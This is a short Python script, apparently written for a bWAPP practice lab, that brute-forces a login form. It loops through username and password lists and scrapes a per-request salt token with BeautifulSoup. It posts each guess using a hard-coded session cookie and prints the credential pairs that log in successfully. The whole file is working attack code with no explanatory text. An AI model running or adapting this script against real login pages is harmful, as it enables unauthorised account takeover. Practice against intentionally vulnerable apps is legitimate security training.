#! /usr/bin/env/python
# -*-coding:utf-8-*-
from bs4 import *
import requests
import sys

head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    'Cookie': 'PHPSESSID=66hasdpmeuflc69hshrmm1qs26; security_level=1'
}

url = 'http://101.198.181.37/bWAPP/ba_pwd_attacks_2.php'
uname = []
hack = {}
t = []
with open('users.txt','r') as f:
    uname.extend(f.read().split('\n'))

for u in uname:
    pwds = []
    with open('passwords.txt', 'r') as f:
        pwds.extend(f.read().split('\n'))
    for p in pwds:

        # 获取salt
        try:
            html1 = requests.get(url, headers=head).text
            data = BeautifulSoup(html1, 'html.parser')
            content = data.find('div', attrs={'id': 'main'})
            content = content.find('input', attrs={'id': 'salt'}).get('value')
        except Exception as e:
            print(e)

        # 打包数据
        post_date = {
            'login':u,
            'password':p,
            'salt': content,
            'form':'submit'
        }
        # print(u,p,content)
        html2 = requests.post(url,data=post_date,headers=head).text
        data2 = BeautifulSoup(html2,'html.parser')
        sys.stdout.write('-')
        sys.stdout.flush()
        if data2.find('font',attrs={'color':'green'}):
            hack[u] = p
print('\n',hack)
